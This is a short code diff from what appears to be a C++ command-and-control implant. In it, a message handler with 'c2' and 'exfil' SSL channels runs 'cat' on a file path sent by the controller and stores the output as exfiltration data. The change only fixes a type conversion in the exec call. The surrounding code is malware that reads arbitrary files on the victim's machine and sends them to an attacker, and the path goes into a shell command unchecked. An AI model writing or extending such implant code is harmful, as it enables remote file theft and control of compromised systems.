@@ -156,7 +156,7 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
     } else if (keyword == "GET") {
         type = 'F';
         std::string full_cmd = "cat " + data;
-        exfil_data = exec(full_cmd);
+        exfil_data = exec(full_cmd.c_str());
     } else {
         c2_response = "ERR " + id;
     }
